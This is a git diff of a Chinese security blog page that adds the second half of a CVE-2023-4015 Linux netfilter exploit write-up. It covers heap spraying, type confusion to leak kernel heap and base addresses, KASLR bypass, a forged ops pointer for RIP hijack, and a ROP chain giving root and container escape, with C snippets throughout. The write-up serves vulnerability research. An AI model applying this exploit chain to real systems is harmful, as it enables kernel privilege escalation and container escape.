+<p>​	<strong>占位与类型混淆</strong><br>​	我们构造了一个包含 <code>notrack</code> 表达式的 <code>nft_rule</code>，并通过大量发送 <code>NFT_MSG_NEWRULE</code> 请求进行喷射。当其中一个 <code>nft_rule</code> 恰好占据了原 <code>c_free</code> 的内存位置时，就发生了关键的类型混淆（Type Confusion）：原 <code>nft_chain</code> 结构体中的 <code>name</code> 指针字段，在内存偏移上恰好与新 <code>nft_rule</code> 结构体中的 <code>list.next</code> 指针重叠。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造 payload 使 nft_rule 大小适配 kmalloc-cg-192</span></span><br><span class="line"><span class="type">char</span> data[<span class="number">191</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_expr) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_rule)] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">rule r = make_rule(current_table_name, <span class="string">&quot;spray&quot;</span>, &amp;e, <span class="number">1</span>, data, <span class="keyword">sizeof</span>(data), <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ... 循环发送 batch_new_rule 进行喷射 ...</span></span><br></pre></td></tr></table></figure>
+
+<p>​	<strong>信息泄露路径</strong><br>​	为了读取这个指针，我们向内核发送 <code>NFT_MSG_GETRULE</code> 命令，请求获取那个一直被我们持有的悬垂指针 <code>r_primitive</code>。内核在处理这个请求时，会调用 <code>nft_verdict_dump</code> 来导出规则中的 <code>immediate</code> 表达式信息。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 触发信息泄露</span></span><br><span class="line">nlmsghdr hdr = dump_rule(r_primitive, buf);</span><br></pre></td></tr></table></figure>
+<p>​	在 <code>nft_verdict_dump</code> 中，内核会试图读取并发送 <code>verdict.chain-&gt;name</code>。由于此时 <code>chain</code> 指针指向的内存已经被我们的 <code>nft_rule</code> 覆盖，内核实际上读取的是 <code>nft_rule-&gt;list.next</code> 的值。</p>
+<p>​	为了验证堆喷射是否成功占位，我们可以通过 GDB 在 <code>nft_immediate_dump</code> 函数处设置断点。当执行到泄露逻辑并触发该断点时，观察受害者链的 <code>name</code> 字段可以发现，它已经不再指向原本的名称字符串，而是指向了一块典型的 slab 内存区域。</p>
+<p>​	通过进一步解析这块内存，我们可以确认其内部结构完全符合我们喷射的 <code>nft_rule</code> 对象（大小为 192 字节）。利用 GDB 的结构体查看功能，我们可以清晰地看到 <code>nft_rule</code> 的元数据，并且通过对其 <code>extensions</code> 区域的进一步探测，能够识别出我们预埋的 <code>nft_expr</code> 表达式类型。这种内存层面的吻合完美证实了受害者链的 <code>name</code> 指针确实已被我们的恶意规则对象所覆盖，类型混淆已成定局。</p>
+<p><img src="/images/CVE-2023-4015/gdb_nft_immediate_dump_1.png" alt="gdb_nft_immediate_dump_1"><br><img src="/images/CVE-2023-4015/gdb_nft_immediate_dump_2.png" alt="gdb_nft_immediate_dump_2"></p>
+<p>​	<strong>解析泄露数据</strong><br>​	在用户态的回调函数 <code>dump_expr_leak_heap</code> 中，我们接收并解析这段数据。由于 <code>list.next</code> 指向的是双向链表中的下一个规则（或链表头），我们得到的是一个内核堆地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">dump_expr_leak_heap</span><span class="params">(expr e, <span class="type">void</span> *_unused)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">r</span> =</span> (<span class="keyword">struct</span> nft_rule *)data;</span><br><span class="line">    heap = (<span class="type">uint64_t</span>)r-&gt;<span class="built_in">list</span>.next;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​	通过这种方式，我们成功将一个内核内部的链表指针作为字符串“偷”了出来。一旦获得这个堆地址，我们就能计算出我们喷射对象的具体位置，从而精准地控制后续的内存布局。这里的list的next也就是上述说的0xffff888102b050c0地址。</p>
+<h2 id="绕过-KASLR-Leak-Kernel-Base"><a href="#绕过-KASLR-Leak-Kernel-Base" class="headerlink" title="绕过 KASLR (Leak Kernel Base)"></a>绕过 KASLR (Leak Kernel Base)</h2><p>​	在获取了堆地址后，下一步就是绕过 KASLR（内核地址空间布局随机化）。我们继续利用 <code>c_free</code> 的 UAF 坑位，但这次我们需要更精细的控制。<code>leak_vmlinux</code> 函数展示了如何通过 <code>nft_table</code> 的 <code>udata</code>（用户自定义数据）功能来实施这一攻击。</p>
+<p>​	<strong>伪造 nft_chain 结构体</strong><br>​	我们不再喷射 <code>nft_rule</code>，而是喷射带有 <code>udata</code> 的 <code>nft_table</code>。<code>udata</code> 的内容完全由用户态控制，我们将一段伪造的 <code>nft_chain</code> 结构体数据填入其中。当这个 <code>udata</code> 恰好覆盖了原 <code>c_free</code> 的位置时，内核再次访问 <code>c_free</code> 时实际上访问的是我们伪造的数据。</p>
+<p>​	<strong>构造任意地址读</strong><br>​	攻击的关键在于伪造链的 <code>name</code> 指针。我们将 <code>fake_chain-&gt;name</code> 指向了堆上的一个特定偏移位置：<code>heap + sizeof(struct nft_rule)</code>。回顾之前的堆喷射，这个位置正好存放着 <code>nft_rule</code> 内部的 <code>nft_expr</code>（表达式）结构体。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 name 指针指向 nft_rule 之后，即 nft_expr 的起始位置</span></span><br><span class="line">fake_chain-&gt;name = (<span class="type">char</span> *)(heap + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_rule));</span><br></pre></td></tr></table></figure>
+
+<p>​	而 <code>nft_expr</code> 结构体的第一个成员正是 <code>ops</code> 指针（指向 <code>nft_expr_ops</code>，如 <code>nft_notrack_ops</code>）。这个 <code>ops</code> 指针位于内核代码段（.text），是一个固定的内核符号地址。通过调试器观察，我们可以清晰地看到伪造的 <code>chain</code> 结构体已经成功占据了内存，且其 <code>name</code> 指针准确地指向了 <code>nft_expr</code> 的起始地址。</p>
+<p>​	<strong>泄露 ops 指针</strong></p>
+<p><img src="/images/CVE-2023-4015/gdb_leak_vmlinux.png" alt="gdb_leak_vmlinux"></p>
+<p>​	当我们再次触发 <code>NFT_MSG_GETRULE</code> 进行 dump 时，内核会顺着这个伪造的 <code>name</code> 指针去读取字符串。结果，它把位于该地址的 <code>nft_notrack_ops</code> 内核函数地址当作字符串读取并发送给了我们。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">dump_expr_leak_vmlinux</span><span class="params">(expr e, <span class="type">void</span> *dat)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);</span><br><span class="line">    <span class="comment">// 直接读取前8字节作为内核地址</span></span><br><span class="line">    vmlinux = *(<span class="type">uint64_t</span> *)data;</span><br><span class="line">    <span class="comment">// 计算内核基址</span></span><br><span class="line">    <span class="keyword">if</span> (vmlinux &gt;= <span class="number">0xffffffff00000000</span>) &#123;</span><br><span class="line">        vmlinux -= NFT_NOTRACK_OPS;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​	通过计算泄露出的 <code>ops</code> 地址与已知的 <code>NFT_NOTRACK_OPS</code> 偏移，我们即可精准计算出内核基址 <code>vmlinux_base</code>，从而彻底击败 KASLR 保护。</p>
+<h2 id="劫持-RIP：udata-喷射的“偷梁换柱”"><a href="#劫持-RIP：udata-喷射的“偷梁换柱”" class="headerlink" title="劫持 RIP：udata 喷射的“偷梁换柱”"></a>劫持 RIP：udata 喷射的“偷梁换柱”</h2><p>​	在之前的堆地址泄露阶段，我们使用了 <code>nft_rule</code> 对象来占位，那是为了利用其内部合法的链表指针。然而，在最终的劫持阶段，我们需要对内存内容拥有<strong>字节级</strong>的完全控制权，特别是要精确伪造 <code>ops</code> 指针。合法的 <code>nft_rule</code> 结构受内核逻辑限制，许多字段无法被用户态随意修改。因此，我们在这里采用了一种更为底层的喷射技术——**<code>nft_table</code> 的 <code>udata</code>（用户定义数据）喷射**。</p>
+<p>​	<code>udata</code> 的核心特性在于其“透传”性：内核会将用户提供的数据原封不动地 <code>memcpy</code> 到堆内存中。这就给了我们实施“偷梁换柱”的绝佳机会。我们不再依赖内核去构造对象，而是在用户态直接构造一个包含恶意 <code>ops</code> 指针的“伪造数据包”，然后利用 <code>udata</code> 机制将其注入到内核堆中。</p>
+<p><img src="/images/CVE-2023-4015/udata_spray_mechanism.png" alt="udata_spray_mechanism"></p>
+<p>​	<strong>用户态构造 payload</strong><br>​	我们在用户态定义一个与 UAF 坑位大小匹配的数组（如 192 字节），并将其强制转换为 <code>nft_rule</code> 和 <code>nft_expr</code> 的结构体指针。注意，此时这些操作完全在用户态内存中进行。我们计算出 <code>ops</code> 指针在结构体中的偏移，并将计算好的恶意地址（指向我们的 JOP Gadget）直接写入该位置。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 在本地准备伪造数据</span></span><br><span class="line"><span class="type">char</span> data[<span class="number">192</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">fake_rule</span> =</span> (<span class="keyword">struct</span> nft_rule *)data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">fake_expr</span> =</span> (<span class="keyword">struct</span> nft_expr *)(data + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_rule));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 将恶意的 ops 指针写入本地数组</span></span><br><span class="line">fake_expr-&gt;ops = (<span class="keyword">struct</span> nft_expr_ops *)(heap + JOP_OFFSET - DEACTIVATE_OFFSET);</span><br></pre></td></tr></table></figure>
+
+<p>​	<strong>内核态堆喷射</strong><br>​	随后，我们调用 <code>make_table</code> 并将这个精心构造的 <code>data</code> 数组作为 <code>udata</code> 传入。内核在处理 <code>NFT_MSG_NEWTABLE</code> 请求时，会申请一块与 <code>data</code> 大小相同的内存。由于其大小恰好也是 192 字节，SLUB 分配器极大概率会将刚刚释放的 UAF 坑位分配给它。紧接着，内核执行内存拷贝，将包含恶意 <code>ops</code> 指针的 <code>data</code> 数据完整地写入这块内核内存。</p>
+<p>​	<strong>最终触发</strong><br>​	当内核随后尝试通过悬垂指针访问这个对象并调用 <code>deactivate</code> 时，它会读取到我们通过 <code>udata</code> 注入的恶意 <code>ops</code> 指针，从而跳转执行 JOP Gadget，开启 ROP 之旅。</p>
+<p>​	<strong>ROP 载荷构造</strong><br>​	由于单个 <code>udata</code> 或规则数据区的空间限制，我们将 ROP 链拆分为两部分。第一段载荷利用 <code>PUSH RSI; JMP QWORD PTR [RSI + 0xF]</code> 指令配合栈迁移 gadget，将 <code>RSP</code> 指向我们的堆区。随后的 ROP 链执行标准的提权流程：</p>
+<ol>
+<li><strong>提权</strong>：调用 <code>commit_creds(prepare_kernel_cred(0))</code> 将当前进程凭证提升为 Root。</li>
+<li><strong>逃逸</strong>：调用 <code>find_task_by_vpid(1)</code> 获取 init 进程，并通过 <code>switch_task_namespaces</code> 切换命名空间以逃逸容器。</li>
+<li><strong>返回</strong>：利用 KPTI 跳板（trampoline）安全返回用户态，执行 <code>system(&quot;/bin/bash&quot;)</code>。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// commit_creds(&amp;init_cred)</span></span><br><span class="line">*rop++ = vmlinux + POP_RDI_RET;</span><br><span class="line">*rop++ = vmlinux + INIT_CRED;</span><br><span class="line">*rop++ = vmlinux + COMMIT_CREDS;</span><br><span class="line"><span class="comment">// ... 命名空间切换与返回用户态 ...</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​	CVE-2023-4015 的复现过程展示了内核利用的艺术：一个微小的事务回滚逻辑缺陷，通过精密的堆布局控制与类型混淆，一步步转化为任意读写，最终实现完全的权限提升。这不仅是对 Netfilter 复杂性的警示，也是对内核开发者在处理原子操作与对象生命周期时必须保持极度严谨的有力证明。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/AliyunCTF--Alimem/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -605,10 +742,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2026-02-07 09:50:00 / Modified: 10:07:58" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:00+08:00">2026-02-07</time>
+              <time title="Created: 2026-02-07 09:50:00" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:00+08:00">2026-02-07</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2026-02-12 14:54:21" itemprop="dateModified" datetime="2026-02-12T14:54:21+08:00">2026-02-12</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -755,10 +898,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2026-02-07 09:50:00 / Modified: 10:10:47" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:00+08:00">2026-02-07</time>
+              <time title="Created: 2026-02-07 09:50:00" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:00+08:00">2026-02-07</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2026-02-12 14:54:21" itemprop="dateModified" datetime="2026-02-12T14:54:21+08:00">2026-02-12</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -918,10 +1067,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2026-02-07 09:50:00 / Modified: 10:07:58" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:00+08:00">2026-02-07</time>
+              <time title="Created: 2026-02-07 09:50:00" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:00+08:00">2026-02-07</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2026-02-12 14:54:21" itemprop="dateModified" datetime="2026-02-12T14:54:21+08:00">2026-02-12</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -1095,7 +1250,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1104,6 +1259,12 @@
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
 </div>
@@ -1138,12 +1299,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">25k</span>
+    <span title="Symbols count total">29k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">1:32</span>
+    <span title="Reading time total">1:44</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
